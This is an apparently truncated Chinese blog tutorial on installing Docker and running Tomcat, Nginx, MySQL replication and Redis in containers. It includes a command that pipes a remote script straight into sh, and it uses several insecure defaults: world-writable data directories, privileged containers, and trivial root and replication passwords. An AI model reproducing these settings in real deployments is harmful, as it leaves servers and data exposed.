class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文本处理的流编辑器 -i直接修改读取的文件内容，而不是输出到终端</span></span><br><span class="line"><span class="comment"># sed -i 's/原字符串/新字符串/' /home/1.txt</span></span><br><span class="line"><span class="comment"># 下面这个是修改ubuntu的源</span></span><br><span class="line">sudo sed -i <span class="string">'s/cn.archive.ubuntu.com/mirrors.aliyun.com/g'</span> /etc/apt/sources.list</span><br><span class="line"><span class="comment"># 更新</span></span><br><span class="line">sudo apt update -y</span><br><span class="line">sudo apt install curl</span><br><span class="line"><span class="comment"># 抓取docker安装脚本到一个文件中</span></span><br><span class="line">curl -fsSL get.docker.com -o get-docker.sh</span><br><span class="line"><span class="comment"># 执行脚本，通过脚本下载 推荐设置阿里云镜像下载加速 默认管理员登陆不加sudo；有警告就忽略</span></span><br><span class="line">sudo sh get-docker.sh --mirror Aliyun</span><br><span class="line"></span><br><span class="line"><span class="comment">#==========解决每次输入sudo问题===========</span></span><br><span class="line"><span class="comment"># 将当前用户加入到docker组，这样每次使用就不需要sudo了</span></span><br><span class="line">sudo gpasswd -a <span class="variable">$&#123;USER&#125;</span> docker</span><br><span class="line"><span class="comment"># 更新用户组,这样才能生效</span></span><br><span class="line">newgrp - docker</span><br><span class="line">sudo service docker restart</span><br><span class="line"></span><br><span class="line"><span class="comment">#============加速器================</span></span><br><span class="line"><span class="comment"># 加速器网址：https://www.daocloud.io/mirror#accelerator-doc，可能有时会失效</span></span><br><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br><span class="line"><span class="comment"># 查看配置文件，自己添加加速器</span></span><br><span class="line">vi /etc/docker/daemon.json</span><br><span class="line"><span class="comment"># &#123;"registry-mirrors": ["http://hub-mirror.c.163.com"]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面地址任选一种就好</span></span><br><span class="line"><span class="comment">#腾讯云的镜像地址</span></span><br><span class="line">https://mirror.ccs.tencentyun.com</span><br><span class="line"><span class="comment">#网易的镜像地址</span></span><br><span class="line">http://hub-mirror.c.163.com</span><br><span class="line"><span class="comment">#下面的地址是假的，需要自己去阿里云 的容器镜像服务-》镜像加速器去复制自己的镜像地址</span></span><br><span class="line">https://xxxx.mirror.aliyuncs.com</span><br><span class="line"><span class="comment">#daocloud发布的镜像地址</span></span><br><span class="line">http://f1361db2.m.daocloud.io</span><br><span class="line"><span class="comment"># 最后要重启</span></span><br><span class="line">sudo systemctl restart docker.service</span><br><span class="line"><span class="comment"># 安装ssh</span></span><br><span class="line">sudo apt install openssh-server</span><br><span class="line"></span><br><span class="line"><span class="comment">#===========docker-compose=============</span></span><br><span class="line"><span class="comment"># 在官网下载符合条件的：https://github.com/docker/compose/releases</span></span><br><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/1.16.1/docker-compose-`uname -s`-`uname -m` -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"><span class="comment"># wget也可以使用来下载</span></span><br><span class="line">mv /usr/<span class="built_in">local</span>/bin/docker-compose-linux-x86_64 /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"><span class="comment"># 记得添加权限</span></span><br><span class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 放在bin目录下，在其他位置可以直接使用</span></span><br><span class="line">sudo mv /usr/<span class="built_in">local</span>/bin/docker-compose-linux-x86_64 /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"><span class="comment"># 第二种方法</span></span><br><span class="line">sudo install docker-compose-linux-x86_64 /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line">docker-compose ps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ============================================</span></span><br><span class="line"><span class="comment"># 2023/6/20可用源</span></span><br><span class="line"><span class="comment"># 编辑 Docker 配置文件</span></span><br><span class="line">sudo vim /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"registry-mirrors"</span>: [</span><br><span class="line">        <span class="string">"https://dockerproxy.com"</span>,</span><br><span class="line">        <span class="string">"https://hub-mirror.c.163.com"</span>,</span><br><span class="line">        <span class="string">"https://mirror.baidubce.com"</span>,</span><br><span class="line">        <span class="string">"https://ccr.ccs.tencentyun.com"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 方法一，采用 systemctl 来重启，推荐</span></span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line"><span class="comment"># 方法二，采用 service 来重启</span></span><br><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure><h1>二、Docker安装基本应用</h1><h2 id="1、Tomcat安装">1、Tomcat安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定时区和中文乱码</span></span><br><span class="line">docker run -d -p 8080:8080 \</span><br><span class="line">--name tomcat \</span><br><span class="line">--restart=always \</span><br><span class="line">-v /home/docker/tomcat/logs/:/usr/<span class="built_in">local</span>/tomcat/logs/ \</span><br><span class="line"><span class="comment"># 这里需要自行创建好webapps内容，或者进入容器将webapps.list改成webapps</span></span><br><span class="line">-v /home/docker/tomcat/webapps/:/usr/<span class="built_in">local</span>/tomcat/webapps/ \</span><br><span class="line">-v /etc/localtime:/etc/localtime \</span><br><span class="line">-e TZ=<span class="string">"Asia/Shanghai"</span> \</span><br><span class="line">-e LANG=<span class="string">"C.UTF-8"</span> \</span><br><span class="line">tomcat:latest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#==========================</span></span><br><span class="line">docker run --name tomcat -p 8080:8080 \</span><br><span class="line">-v tomcatconf:/usr/<span class="built_in">local</span>/tomcat/conf \</span><br><span class="line">-v tomcatwebapp:/usr/<span class="built_in">local</span>/tomcat/webapps \</span><br><span class="line">-d tomcat:jdk8-openjdk-slim-buster</span><br></pre></td></tr></table></figure><p>docker-compose部署</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">tomcat:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">tomcat:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">tomcat</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:8080</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">TZ:</span> <span class="string">"Asia/Shanghai"</span></span><br><span class="line">      <span class="attr">LANG:</span> <span class="string">"C.UTF-8"</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/opt/tomcat/conf/server.xml:/usr/local/tomcat/server.xml</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/opt/tomcat/webapps:/usr/local/tomcat/webapps</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/opt/tomcat/logs:/usr/local/tomcat/logs</span></span><br></pre></td></tr></table></figure><h2 id="2、Nginx安装">2、Nginx安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.digitalocean.com/community/tools/nginx</span></span><br><span class="line"><span class="comment"># 注意 外部的/nginx/conf下面的内容必须存在，否则挂载会覆盖</span></span><br><span class="line">docker run -p 80:80 -p 443:443 --name nginx \</span><br><span class="line">-v /usr/<span class="built_in">local</span>/docker/nginx/html:/usr/share/nginx/html \</span><br><span class="line">-v /usr/<span class="built_in">local</span>/docker/nginx/logs:/var/<span class="built_in">log</span>/nginx \</span><br><span class="line">-v /usr/<span class="built_in">local</span>/docker/nginx/conf/:/etc/nginx \</span><br><span class="line">-d nginx:1.20.1</span><br></pre></td></tr></table></figure><p>docker-compose部署</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">80</span><span class="string">:80</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">443</span><span class="string">:443</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./conf/nginx/log/:/var/log/nginx</span></span><br><span class="line">      <span class="comment"># 注意：如下挂载都是覆盖</span></span><br><span class="line">      <span class="comment">#- ./conf/nginx/conf.d:/etc/nginx/conf.d</span></span><br><span class="line">      <span class="comment">#- ./conf/nginx/nginx.conf:/etc/nginx/nginx.conf:ro</span></span><br><span class="line">      <span class="comment">#- ./conf/nginx/html:/usr/share/nginx/html</span></span><br></pre></td></tr></table></figure><h2 id="3、Mysql安装">3、Mysql安装</h2><h3 id="3-1-单机版安装">3.1 单机版安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 5.7版本</span></span><br><span class="line">docker run -p 3306:3306 --name mysql57 \</span><br><span class="line">-v /app/mysql/<span class="built_in">log</span>:/var/<span class="built_in">log</span>/mysql \</span><br><span class="line">-v /app/mysql/data:/var/lib/mysql \</span><br><span class="line">-v /app/mysql/conf:/etc/mysql/conf.d \</span><br><span class="line">-v /etc/localtime:/etc/localtime:ro</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=123456 \</span><br><span class="line">-d mysql:5.7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#8.x版本,引入了 secure-file-priv 机制，磁盘挂载将没有权限读写data数据，所以需要将权限透传，或者</span></span><br><span class="line">chmod -R 777 /app/mysql/data</span><br><span class="line"></span><br><span class="line"><span class="comment"># --privileged 特权容器，容器内使用真正的root用户</span></span><br><span class="line">docker run -p 3306:3306 --name mysql8 \</span><br><span class="line">-v /app/mysql/conf:/etc/mysql/conf.d \</span><br><span class="line">-v /app/mysql/<span class="built_in">log</span>:/var/<span class="built_in">log</span>/mysql \</span><br><span class="line">-v /app/mysql/data:/var/lib/mysql \</span><br><span class="line">-v /etc/localtime:/etc/localtime:ro</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=123456 \</span><br><span class="line">--privileged \ </span><br><span class="line">-d mysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 针对配置文件，新建 my.cnf (/usr/local/mysql/conf)，否则中文乱码</span></span><br><span class="line">[client]</span><br><span class="line">default_character_set=utf8 </span><br><span class="line">[mysqld] </span><br><span class="line">collation_server = utf8_general_ci </span><br><span class="line">character_set_server = utf8</span><br></pre></td></tr></table></figure><p>docker-compose部署</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version :</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="comment"># 容器名</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">mysql5</span></span><br><span class="line">    <span class="comment"># 重启策略</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:5.7</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"3306:3306"</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">       <span class="comment"># 挂载配置文件</span></span><br><span class="line">       <span class="comment">#  - ./mysql/db/:/docker-entrypoint-initdb.d</span></span><br><span class="line">      <span class="comment"># 挂载配置文件</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./mysql/conf:/etc/mysql/conf.d</span></span><br><span class="line">      <span class="comment"># 挂载日志</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./mysql/logs:/logs</span></span><br><span class="line">      <span class="comment"># 挂载数据</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./mysql/data:/var/lib/mysql</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">[</span></span><br><span class="line">          <span class="string">'mysqld'</span><span class="string">,</span></span><br><span class="line">          <span class="string">'--innodb-buffer-pool-size=80M'</span><span class="string">,</span></span><br><span class="line">          <span class="string">'--character-set-server=utf8mb4'</span><span class="string">,</span></span><br><span class="line">          <span class="string">'--collation-server=utf8mb4_unicode_ci'</span><span class="string">,</span></span><br><span class="line">          <span class="string">'--default-time-zone=+8:00'</span><span class="string">,</span></span><br><span class="line">          <span class="string">'--lower-case-table-names=1'</span></span><br><span class="line">        <span class="string">]</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="comment"># root 密码</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="number">123456</span></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line"><span class="comment">#======================mysql8.0=================</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">mysql8</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="comment"># 注意8.0以后的问题</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:8.0</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="comment"># 挂载配置文件</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./mysql/conf:/etc/mysql/conf.d</span></span><br><span class="line">      <span class="comment"># 挂载日志</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./mysql/logs:/logs</span></span><br><span class="line">      <span class="comment"># 挂载数据</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./mysql/data:/var/lib/mysql</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">      <span class="string">--character-set-server=utf8mb4</span></span><br><span class="line">      <span class="string">--collation-server=utf8mb4_general_ci</span></span><br><span class="line">      <span class="string">--explicit_defaults_for_timestamp=true</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="string">LANG=C.UTF-8</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=root</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">33106</span><span class="string">:3306</span></span><br><span class="line">    <span class="attr">network_mode:</span> <span class="string">"bridge"</span></span><br></pre></td></tr></table></figure><h3 id="3-2-主从复制">3.2 主从复制</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、新建主服务器容器实例3307</span></span><br><span class="line">docker run -p 3307:3306 --name mysql-master \</span><br><span class="line">-v /usr/<span class="built_in">local</span>/docker/mysql-master/<span class="built_in">log</span>:/var/<span class="built_in">log</span>/mysql \</span><br><span class="line">-v /usr/<span class="built_in">local</span>/docker/mysql-master/data:/var/lib/mysql \</span><br><span class="line">-v /usr/<span class="built_in">local</span>/docker/mysql-master/conf:/etc/mysql \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=root -d mysql:5.7</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、进入/usr/local/docker/mysql-master/conf目录下新建 my.cnf</span></span><br><span class="line"><span class="comment">#==================================</span></span><br><span class="line">[mysqld]</span><br><span class="line"><span class="comment">## 设置server_id，同一局域网中需要唯一 </span></span><br><span class="line">server_id=101</span><br><span class="line"><span class="comment">## 指定不需要同步的数据库名称 </span></span><br><span class="line">binlog-ignore-db=mysql</span><br><span class="line"><span class="comment">## 开启二进制日志功能 </span></span><br><span class="line"><span class="built_in">log</span>-bin=mall-mysql-bin </span><br><span class="line"><span class="comment">## 设置二进制日志使用内存大小（事务） </span></span><br><span class="line">binlog_cache_size=1M</span><br><span class="line"><span class="comment">## 设置使用的二进制日志格式（mixed,statement,row） </span></span><br><span class="line">binlog_format=mixed</span><br><span class="line"><span class="comment">## 二进制日志过期清理时间。默认值为0，表示不自动清理。 </span></span><br><span class="line">expire_logs_days=7</span><br><span class="line"><span class="comment">## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。 </span></span><br><span class="line"><span class="comment">## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致 </span></span><br><span class="line">slave_skip_errors=1062</span><br><span class="line"><span class="comment">#====================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、修改完配置后重启master实例</span></span><br><span class="line">docker restart mysql-master</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4、进入mysql-master容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mysql-master /bin/bash</span><br><span class="line">mysql -uroot -proot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5、master容器实例内创建数据同步用户</span></span><br><span class="line">CREATE USER <span class="string">'slave'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'123456'</span>;</span><br><span class="line">GRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO <span class="string">'slave'</span>@<span class="string">'%'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6、新建从服务器容器实例3308</span></span><br><span class="line">docker run -p 3308:3306 --name mysql-slave \</span><br><span class="line">-v /usr/<span class="built_in">local</span>/docker/mysql-slave/<span class="built_in">log</span>:/var/<span class="built_in">log</span>/mysql \</span><br><span class="line">-v /usr/<span class="built_in">local</span>/docker/mysql-slave/data:/var/lib/mysql \</span><br><span class="line">-v /usr/<span class="built_in">local</span>/docker/mysql-slave/conf:/etc/mysql \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=root -d mysql:5.7</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7、进入/usr/local/docker/mysql-slave/conf目录下新建my.cnf</span></span><br><span class="line"><span class="comment"># ====================================================</span></span><br><span class="line">[mysqld] </span><br><span class="line"><span class="comment">## 设置server_id，同一局域网中需要唯一 </span></span><br><span class="line">server_id=102</span><br><span class="line"><span class="comment">## 指定不需要同步的数据库名称 </span></span><br><span class="line">binlog-ignore-db=mysql</span><br><span class="line"><span class="comment">## 开启二进制日志功能，以备Slave作为其它数据库实例的Master时使用 </span></span><br><span class="line"><span class="built_in">log</span>-bin=mall-mysql-slave1-bin</span><br><span class="line"><span class="comment">## 设置二进制日志使用内存大小（事务） </span></span><br><span class="line">binlog_cache_size=1M</span><br><span class="line"><span class="comment">## 设置使用的二进制日志格式（mixed,statement,row） </span></span><br><span class="line">binlog_format=mixed</span><br><span class="line"><span class="comment">## 二进制日志过期清理时间。默认值为0，表示不自动清理。 </span></span><br><span class="line">expire_logs_days=7</span><br><span class="line"><span class="comment">## 跳过主从复制中遇到的所有错误或指定类型的错误，避免slave端复制中断。 </span></span><br><span class="line"><span class="comment">## 如：1062错误是指一些主键重复，1032错误是因为主从数据库数据不一致 </span></span><br><span class="line">slave_skip_errors=1062</span><br><span class="line"><span class="comment">## relay_log配置中继日志 </span></span><br><span class="line">relay_log=mall-mysql-relay-bin</span><br><span class="line"><span class="comment">## log_slave_updates表示slave将复制事件写进自己的二进制日志 </span></span><br><span class="line">log_slave_updates=1</span><br><span class="line"><span class="comment">## slave设置为只读（具有super权限的用户除外） </span></span><br><span class="line">read_only=1</span><br><span class="line"><span class="comment"># ====================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 8、修改完配置后重启slave实例</span></span><br><span class="line">docker restart mysql-slave</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9、在主数据库中查看主从同步状态</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mysql-master /bin/bash</span><br><span class="line">mysql -uroot -proot</span><br><span class="line">show master status;</span><br><span class="line">mysql&gt; show master status;</span><br><span class="line">+-----------------------+----------+--------------+------------------+-------------------+</span><br><span class="line">| File                  | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</span><br><span class="line">+-----------------------+----------+--------------+------------------+-------------------+</span><br><span class="line">| mall-mysql-bin.000001 |      617 |              | mysql            |                   |</span><br><span class="line">+-----------------------+----------+--------------+------------------+-------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10、在从数据库中配置主从复制</span></span><br><span class="line">change master to master_host=<span class="string">'宿主机ip'</span>, master_user=<span class="string">'slave'</span>, master_password=<span class="string">'123456'</span>, master_port=3307, master_log_file=<span class="string">'mall-mysql-bin.000001'</span>, master_log_pos=617, master_connect_retry=30; </span><br><span class="line">mysql&gt; change master to master_host=<span class="string">'106.14.76.55'</span>, master_user=<span class="string">'slave'</span>, master_password=<span class="string">'123456'</span>, master_port=3307, master_log_file=<span class="string">'mall-mysql-bin.000001'</span>, master_log_pos=617, master_connect_retry=30;</span><br><span class="line">Query OK, 0 rows affected, 2 warnings (0.03 sec)</span><br><span class="line"></span><br><span class="line"><span class="comment"># master_host：主数据库的IP地址； </span></span><br><span class="line"><span class="comment"># master_port：主数据库的运行端口； </span></span><br><span class="line"><span class="comment"># master_user：在主数据库创建的用于同步数据的用户账号； </span></span><br><span class="line"><span class="comment"># master_password：在主数据库创建的用于同步数据的用户密码； </span></span><br><span class="line"><span class="comment"># master_log_file：指定从数据库要复制数据的日志文件，通过查看主数据的状态，获取File参数； </span></span><br><span class="line"><span class="comment"># master_log_pos：指定从数据库从哪个位置开始复制数据，通过查看主数据的状态，获取Position参数； </span></span><br><span class="line"><span class="comment"># master_connect_retry：连接失败重试的时间间隔，单位为秒。 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 11、在从数据库中查看主从同步状态</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mysql-slave /bin/bash</span><br><span class="line">mysql -uroot -proot</span><br><span class="line">show slave status \G;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 12、在从数据库中开启主从同步看到Slave_IO_Running和Slave_SQL_Running启动就行</span></span><br><span class="line">start slave;</span><br></pre></td></tr></table></figure><h2 id="4、Redis安装">4、Redis安装</h2><h3 id="4-1-单机版安装">4.1 单机版安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 